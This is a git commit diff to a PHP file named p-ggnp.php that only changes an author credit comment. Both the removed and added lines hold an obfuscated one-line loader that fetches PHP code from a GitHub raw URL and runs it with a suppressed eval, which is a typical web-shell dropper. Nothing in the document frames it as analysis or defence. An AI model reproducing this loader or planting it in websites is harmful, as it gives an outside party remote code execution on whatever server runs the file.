61272a3a54052e10367bb1631e0f9adb1d9d540f
Z4PHY <157162927+z4phyr@users.noreply.github.com>
2024-01-27 13:53:34 +0700

    Update p-ggnp.php

--- p-ggnp.php
+++ p-ggnp.php
@@ -1,1 +1,1 @@
-<?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/z4phyr/z4phy/main/ggnp.php"))/******/ /*By NuLz404*/?>
+<?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/z4phyr/z4phy/main/ggnp.php"))/******/ /*z4p*/?>
